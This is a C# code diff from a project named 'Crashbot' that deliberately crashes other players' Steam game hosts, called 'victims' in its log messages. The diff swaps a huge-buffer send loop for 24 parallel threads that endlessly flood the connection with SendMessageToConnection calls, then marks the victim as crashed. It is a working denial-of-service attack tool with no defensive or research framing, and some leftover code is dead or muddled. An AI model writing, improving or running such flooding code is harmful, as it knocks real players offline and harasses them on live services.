@@ -203,7 +203,7 @@ namespace Crashbot
             if (!mega_victim.IsCrashing)
             {
                 Logger.WriteLine($"Preparing to crash host {mega_victim.HostSteamId} for victim {mega_victim.SteamId}", Verbosity.Verbose);
-               
+
                 SteamNetworkingIdentity remoteIdentity = new();
                 interuptSource.Register();
                 mega_victim.IsCrashing = true;
@@ -224,23 +224,37 @@ namespace Crashbot
 
                 // Wait for 1 msg or 2 seconds
                 //CancellationTokenSource cancellationTokenSource = new();
-
                 //Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
                 //{
-                    byte[] ary = new byte[int.MaxValue];
-                    Parallel.For(0, FUN_TIME, _ => this.SteamThread.SendMessageToConnection(conn, ary, 0, 0));
-                    this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
 
-                    mega_victim.OnVictimCrashed();
-                    Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
+                byte[] ary = []; // new byte[int.MaxValue];
 
-                    while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally)
-                        this.SteamThread.GetConnectionInfo(conn, out info);
+                Parallel.For(0, 24, _ =>
+                {
+                    unsafe
+                    {
+                        fixed (byte* p = ary)
+                        {
+                            while (true)
+                            {
+                                nint pData = (nint)p;
+                                var res = SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
+                            }
+                        }
+                    }
+                });
 
-                    mega_victim.IsCrashing = false;
-                    interuptSource.Completed();
+                //this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
+
+                mega_victim.OnVictimCrashed();
+                Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
+
+                while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally)
+                    this.SteamThread.GetConnectionInfo(conn, out info);
+
+                mega_victim.IsCrashing = false;
+                interuptSource.Completed();
                 //});
-
                 //Task.Delay(5000).ContinueWith(_ => cancellationTokenSource.Cancel());
             }
         }
